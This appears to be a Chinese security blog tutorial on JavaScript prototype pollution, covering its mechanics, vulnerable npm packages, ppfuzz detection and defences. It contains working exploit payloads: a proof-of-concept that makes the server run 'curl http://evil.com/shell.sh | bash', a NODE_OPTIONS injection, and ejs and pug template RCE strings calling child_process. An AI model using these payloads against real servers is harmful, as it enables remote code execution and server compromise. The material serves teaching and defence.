---
title: 原型链污染攻击
date: 2026-07-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: 原型链污染攻击——__proto__/constructor.prototype 污染与 RCE 利用链。
categories: 渗透测试
cover: /img/prototype-pollution-cover.png
---

## 前言

在JavaScript中，一切皆为对象，而对象之间的继承机制依赖的正是**原型链（Prototype Chain）**。当你访问 `obj.key` 时，JavaScript 引擎会沿着 `obj.__proto__` → `obj.__proto__.__proto__` → ... → `null` 的链路逐级查找，直到找到该属性或达到链的末端。

原型链污染（Prototype Pollution）正是利用了这一机制：攻击者通过修改 `Object.prototype` 或其它构造函数的 `prototype` 对象，向原型链中注入恶意属性，从而影响所有继承自该原型的对象。本文将带你从原理到实战，全面掌握这一漏洞的挖掘与利用技巧。

---

## 一、原型链基础回顾

### 1.1 三个核心概念

| 概念 | 说明 |
|:--|:--|
| `__proto__` | 每个对象都有的隐式原型指针，指向其构造函数的 `prototype` |
| `constructor.prototype` | 每个函数都有的显式原型对象，该函数构造出的实例的 `__proto__` 指向它 |
| `Object.prototype` | 原型链的顶端，所有普通对象最终都会继承它的属性 |

```javascript
// 直观理解三者的关系
function Person(name) {
    this.name = name;
}
const alice = new Person('Alice');

console.log(alice.__proto__ === Person.prototype);          // true
console.log(Person.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__);                     // null
```

### 1.2 属性解析过程（流程图）

```
访问 obj.key
     │
     ▼
obj 自身有 key 吗？ ──是──▶ 返回 obj.key
     │ 否
     ▼
obj.__proto__ 有 key 吗？ ──是──▶ 返回 obj.__proto__.key
     │ 否
     ▼
obj.__proto__.__proto__ 有 key 吗？ ──是──▶ 返回
     │ 否
     ▼
   ... 继续沿链向上 ...
     │
     ▼
   null（终点）──▶ 返回 undefined
```

一旦 `Object.prototype` 被污染（例如被注入 `polluted: true`），那么**所有以 `Object.prototype` 为终点的对象**在访问 `.polluted` 时都会返回 `true`，而它们自身从未定义过该属性。

---

## 二、漏洞成因：不安全的对象操作

原型链污染的根源在于**递归合并（merge）、克隆（clone）、路径赋值（extend/set）**等操作没有对 `__proto__`、`constructor`、`prototype` 等特殊键做过滤，导致攻击者可以将数据写入原型对象。

### 2.1 典型脆弱函数

```javascript
// 脆弱合并函数 (merge)
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// 攻击载荷
const malicious = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge({}, malicious);

// 污染生效：所有普通对象现在都有了 isAdmin 属性
const user = {};
console.log(user.isAdmin);  // true ！
```

### 2.2 真实世界中的脆弱点

以下 npm 包的历史版本曾存在原型链污染漏洞（CVE编号可供自查）：

| 包名 | 脆弱函数 | CVE 示例 |
|:--|:--|:--|
| `lodash` (<4.17.11) | `_.defaultsDeep` | CVE-2019-10744 |
| `jQuery` (<3.4.0) | `$.extend` | CVE-2019-11358 |
| `hoek` (<6.1.3) | `hoek.merge` | CVE-2018-3728 |
| `deep-extend` (<0.5.1) | `deepExtend` | CVE-2018-3750 |
| `merge-object` | `merge()` | CVE-2018-16487 |
| `set-value` (<3.0.1) | `set()` | CVE-2019-10747 |

### 2.3 更多攻击向量

除了直接使用 `__proto__`，攻击者还可以通过 `constructor.prototype` 绕过高版本 Node.js 对 `__proto__` 的部分限制：

```javascript
// 绕过技术：利用 constructor.prototype
const payload = JSON.parse('{"constructor":{"prototype":{"shell":"/bin/sh"}}}');
merge({}, payload);

const obj = {};
console.log(obj.shell);  // /bin/sh
```

---

## 三、从信息泄露到远程代码执行的攻击链

原型链污染本身只是一个**属性注入机制**，但结合具体的应用逻辑，可以串联出从低危到高危的完整利用链。

### 3.1 第一阶段：污染生效 → 前端 XSS

```javascript
// 场景：模板引擎从配置对象中读取 sanitize 标志
const templateConfig = {};
// ... merge 操作被污染，__proto__.sanitize = false

function renderHTML(userInput) {
    // config.sanitize 从原型上读取到了 false
    if (this.config.sanitize !== false) {
        userInput = escapeHtml(userInput);
    }
    document.getElementById('app').innerHTML = userInput;
}

// 攻击者可以注入 <img src=x onerror=alert(1)>
```

### 3.2 第二阶段：污染生效 → SQL 注入

```javascript
// 场景：ORM 查询构建器从 options 对象读取构建参数
const queryOptions = {};
// 原型被污染：__proto__.escape = false

function buildWhere(conditions, options) {
    const escape = options.escape !== false;  // 从原型读取到 false
    let sql = 'SELECT * FROM users WHERE ';
    for (let [col, val] of Object.entries(conditions)) {
        const safeVal = escape ? quote(val) : val;
        sql += `${col} = ${safeVal} AND `;
    }
    return sql.slice(0, -5);
}

// 攻击者可以绕过引号转义，注入 UNION SELECT ...
```

### 3.3 第三阶段：污染生效 → 服务端 RCE

这是危害性最高的利用链，常见于 Node.js 服务端应用。以下展示一条完整的 RCE 攻击路径：

```javascript
// ── 脆弱后端代码 ──
const express = require('express');
const app = express();

// 一个存在 merge 操作的路由
app.post('/api/config', (req, res) => {
    const defaults = { theme: 'light', lang: 'en' };
    merge(defaults, req.body);           // 这里发生污染
    res.json({ status: 'ok' });
});

// 另一条路由使用 child_process 执行用户可控的程序名
app.get('/api/report', (req, res) => {
    const options = {};
    // 注意：spawn 的第三个参数 options 也是一个普通对象
    // 如果原型被污染了 __proto__.shell = '/bin/bash' 或注入额外环境变量

    // 更常见的利用点：某些框架根据配置决定运行时行为
    const proc = require('child_process').execSync(
        options.cmd || 'uptime',         // 污染点：__proto__.cmd
        options
    );
    res.send(proc.toString());
});
```

**POC 攻击步骤：**

```
POST /api/config HTTP/1.1
Content-Type: application/json

{
    "__proto__": {
        "cmd": "curl http://evil.com/shell.sh | bash"
    }
}

# 然后触发：
GET /api/report
# 服务端 execSync 执行了恶意命令
```

**另一种经典 RCE 路径 —— 污染 env 变量：**

```javascript
// Node 的 child_process 模块会将 options.env 传递给子进程
// 若通过原型污染注入 NODE_OPTIONS 环境变量，可实现代码执行

const payload = {
    "__proto__": {
        "env": {
            "NODE_OPTIONS": "--require=/tmp/malicious.js"
        },
        "NODE_OPTIONS": "--require=/tmp/malicious.js"
    }
};
```

### 3.4 利用链全景图

```
      JSON.parse 注入恶意键
              │
              ▼
    merge/clone/extend (未过滤 __proto__)
              │
              ▼
       Object.prototype 被污染
              │
   ┌──────────┼──────────┬──────────────┐
   ▼          ▼          ▼              ▼
 配置对象   查询对象   模板上下文   运行时选项
   │          │          │              │
   ▼          ▼          ▼              ▼
 权限绕过   SQL注入     XSS      child_process RCE
   │          │          │              │
   ▼          ▼          ▼              ▼
  越权操作   数据库沦陷  用户劫持    服务器沦陷
```

---

## 四、自动化检测工具：ppfuzz

[ppfuzz](https://github.com/dwisiswant0/ppfuzz) 是一款专门用于原型链污染模糊测试的工具，它能够自动化识别存在 prototype pollution 的端点。

### 4.1 安装与基础用法

```bash
# 安装
go install github.com/dwisiswant0/ppfuzz@latest

# 对单个URL进行测试
ppfuzz -u "https://target.com/api/merge" -m POST -d '{"user":"test"}'

# 从文件批量测试
ppfuzz -l urls.txt -H "Authorization: Bearer xxx"
```

### 4.2 检测原理

ppfuzz 会向目标发送包含 `__proto__` 载荷的请求，随后通过多种**回显检测技术**判断污染是否成功：

```javascript
// 检测策略示例 — 发往目标的载荷
{
    "user": "test",
    "__proto__": {
        "ppfuzz_key": "ppfuzz_value_1337"
    }
}

// ppfuzz 随后发送第二个请求，在响应中查找 ppfuzz_key 是否被反射
// 如果服务端在响应中意外地输出了 ppfuzz_key，则说明污染成功
```

### 4.3 自定义检测规则

ppfuzz 支持自定义模板，用于适配不同的应用场景：

```yaml
# custom_template.yaml
id: prototype-pollution-detection
info:
  name: PP Detection
  severity: critical

requests:
    path:
      - "/api/merge"
    headers:
      Content-Type: application/json
    body: |
      {
        "__proto__": {
          "status": "polluted"
        }
      }

    matchers:
      - type: word
        words:
          - "polluted"
        part: body
```

### 4.4 手工检测技法

在没有工具的情况下，可以采用以下手工方法验证污染：

```bash
# 方法1：发送污染载荷并观察错误堆栈
curl -X POST https://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# 方法2：对比属性描述符（ES5+）
# 如果目标端点有调试日志，可以观察 toString/valueOf 行为异常
curl -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"toString":"polluted"}}'

# 方法3：污染 constructor 链
curl -X POST https://target.com/api/extend \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"shell":"/bin/sh"}}}'
```

---

## 五、CTF 经典案例剖析

### 5.1 案例一：[HITCON CTF] Ghost in the Prototype

**场景：** 一个 Express 博客应用，用户可提交配置合并请求。

**漏洞代码：**
```javascript
app.post('/settings', (req, res) => {
    let userSettings = {};
    Object.assign(userSettings, req.body);  // 直接 assign 不会污染
    // 但后续使用了 lodash < 4.17.11
    userSettings = _.defaultsDeep(userSettings, defaultSettings);
    req.session.settings = userSettings;
});
```

**利用：** 通过 `defaultsDeep` 污染 `Object.prototype.role = 'admin'`，后续路由中 `req.session.role` 从原型读取到 `admin`，造成权限提升。

### 5.2 案例二：原型污染 + ejs 模板引擎 RCE

ejs 模板引擎的 `renderFile` 函数会将 `options` 合并到内部对象上。如果攻击者能污染 `Object.prototype`，就可以注入 ejs 的输出函数路径 (`outputFunctionName`)，实现 RCE：

```javascript
// 污染载荷
const payload = {
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
    }
};

// 触发 RCE
app.get('/page', (req, res) => {
    // 当 ejs 渲染时，outputFunctionName 从原型读取
    res.render('page', { title: 'Home' });
});
```

**原理：** ejs 内部使用 `prepended += 'var ' + opts.outputFunctionName + ' = ...'` 拼接字符串生成模板函数体，`outputFunctionName` 被注入后直接拼入了可执行代码。

### 5.3 案例三：原型污染 + pug 模板引擎 RCE

pug（原 Jade）的 `compile` 函数同样会接收 options 对象。污染 `Object.prototype` 中的 `compileDebug`、`self` 等字段可以注入恶意代码：

```javascript
// 污染原型
Object.prototype.line = 'global.process.mainModule.require("child_process").execSync("id")';
Object.prototype.self = 1;

// 触发 pug 编译 → RCE
const pug = require('pug');
pug.compile('h1 Hello');
```

---

## 六、防御方案

### 6.1 开发层面

```javascript
// 方法1：使用 Object.create(null) 创建无原型对象
const safe = Object.create(null);
safe.__proto__  // undefined — 彻底阻断原型链

// 方法2：在合并时过滤危险键
const BLOCKED_KEYS = ['__proto__', 'constructor', 'prototype'];

function safeMerge(target, source) {
    for (const key of Object.keys(source)) {   // 注意用 Object.keys 而非 for...in
        if (BLOCKED_KEYS.includes(key)) continue;
        if (typeof source[key] === 'object' && source[key] !== null) {
            target[key] = safeMerge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// 方法3：冻结 Object.prototype（谨慎使用，副作用大）
Object.freeze(Object.prototype);
Object.freeze(Object);
```

### 6.2 运维与架构层面

| 层级 | 措施 |
|:--|:--|
| 依赖管理 | 定期 `npm audit`，锁定 lodash/hoek 等包的版本 |
| WAF 规则 | 拦截请求体中包含 `__proto__` / `constructor.prototype` 的 JSON |
| 代码审计 | 对 `merge`、`extend`、`clone`、`set` 的调用点做专项审查 |
| 运行时检测 | 使用 `--disallow-code-generation-from-strings` 标志启动 Node.js |
| Schema 校验 | 所有用户输入必须经过 JSON Schema 校验，拒绝未知属性 |

### 6.3 运行时监控

```javascript
// 在应用启动时注入原型访问监控（仅用于测试/调试环境）
const _origSetter = Object.prototype.__defineSetter__;
Object.prototype.__defineSetter__('__proto__', function(val) {
    console.trace('[ALERT] Attempt to set __proto__');
    return _origSetter.call(this, '__proto__', val);
});
```

---

## 七、总结

原型链污染是 JavaScript/Node.js 生态中一类根源于语言特性的漏洞，它的威力来自于**一次污染、全局生效**的覆盖能力。虽然现代框架和运行时已经做了很多防御（如 `Object.create(null)` 的推广、`lodash` 的修复），但在复杂的依赖树中，仍然可能有某个冷门包的 `merge` 在静默地打开一扇后门。

对于渗透测试工程师来说，原型链污染的挖掘需要：
1. **识别数据流中的 merge/extend/set 操作**；
2. **追踪污染属性在后续业务逻辑中的利用点**；
3. **构建从污染到具体危害的完整利用链**。

防御方则应当采取**纵深防御**策略：开发层过滤危险键 → Schema 层拒绝未知属性 → 运行时冻结原型 → WAF 层拦截载荷。

---

## 参考链接

- [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [CVE-2019-10744: lodash defaultsDeep 原型链污染](https://nvd.nist.gov/vuln/detail/CVE-2019-10744)
- [ppfuzz - Prototype Pollution Fuzzer](https://github.com/dwisiswant0/ppfuzz)
- [BlackFan - Client Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [HITCON CTF 相关 Writeups](https://ctftime.org/event/669/tasks/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

## 免责声明

本文所述技术仅用于安全研究、授权渗透测试和CTF竞赛等合法场景。未经授权对计算机系统进行攻击、入侵或利用原型链污染漏洞获取未授权访问均属违法行为，可能构成《刑法》第285条（非法侵入计算机信息系统罪）、第286条（破坏计算机信息系统罪）等刑事犯罪。作者不对任何因滥用本文技术而导致的直接或间接损失承担责任。请遵守当地法律法规，在获得明确书面授权后方可进行安全测试。
